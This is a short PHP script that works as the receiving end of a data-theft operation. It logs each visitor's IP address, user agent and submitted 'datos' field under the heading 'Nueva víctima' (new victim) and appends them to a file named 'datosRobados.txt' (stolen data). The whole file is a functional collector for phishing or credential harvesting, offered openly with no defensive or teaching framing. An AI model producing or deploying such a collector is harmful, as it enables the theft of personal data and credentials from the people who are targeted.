<?php
date_default_timezone_set("America/Panama");
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$datos = $_POST['datos'] ?? 'Sin datos';

$log = "Nueva víctima:\n";
$log .= "IP: $ip\n";
$log .= "User-Agent: $user_agent\n";
$log .= "Datos recibidos: $datos\n";
$log .= "Fecha: " . date("Y-m-d H:i:s") . "\n";
$log .= "-------------------------------\n";

file_put_contents("datosRobados.txt", $log, FILE_APPEND);

echo "OK";
?>
